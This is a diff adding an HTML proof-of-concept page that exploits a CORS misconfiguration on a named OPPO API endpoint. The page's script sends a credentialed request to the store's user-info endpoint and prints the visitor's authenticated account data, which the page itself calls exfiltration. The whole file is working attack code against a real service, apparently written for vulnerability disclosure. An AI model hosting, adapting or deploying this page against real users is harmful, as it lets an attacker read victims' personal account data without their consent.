@@ -1,0 +1,37 @@
+<!-- cors-poc.html -->
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>OPPO CORS Misconfiguration PoC</title>
+  <style>
+    body { font-family: sans-serif; padding: 2rem; background: #f9f9f9; }
+    pre { background: #eee; padding: 1rem; white-space: pre-wrap; }
+  </style>
+</head>
+<body>
+  <h2>🔐 OPPO CORS Misconfiguration Exploit</h2>
+  <p>Attempting to exfiltrate authenticated user info from OPPO API...</p>
+  <pre id="result">Loading...</pre>
+
+  <script>
+    fetch("https://opsg-gateway-in.oppo.com/v2/api/rest/mall/user/info/fetch", {
+      method: "POST",
+      credentials: "include",
+      headers: {
+        "Content-Type": "application/json"
+      },
+      body: JSON.stringify({
+        storeViewCode: "in"
+      })
+    })
+    .then(res => res.json())
+    .then(data => {
+      document.getElementById("result").textContent = JSON.stringify(data, null, 2);
+    })
+    .catch(err => {
+      document.getElementById("result").textContent = "Error: " + err;
+    });
+  </script>
+</body>
+</html>
